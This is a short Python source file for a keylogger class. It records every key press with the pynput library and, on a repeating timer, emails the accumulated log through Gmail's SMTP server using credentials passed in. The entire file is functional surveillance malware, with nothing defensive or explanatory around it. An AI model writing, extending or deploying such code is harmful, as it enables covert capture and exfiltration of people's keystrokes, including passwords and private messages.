#!/usr/bin/env python
import pynput.keyboard
import threading, smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.pwd = password
        #print("Constructor!!")

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        #print(self.log)
        self.send_mail(self.email, self.pwd, "\n\n" + self.log)
        self.log = ""#setting log to empty since after reporting we dont want repetition of same reported stuff.
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        #once timer is started,the program will wait for 5 sec and then execute the report fun,meanwhile
        #the process_key fun will be running on a seperate thread.

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()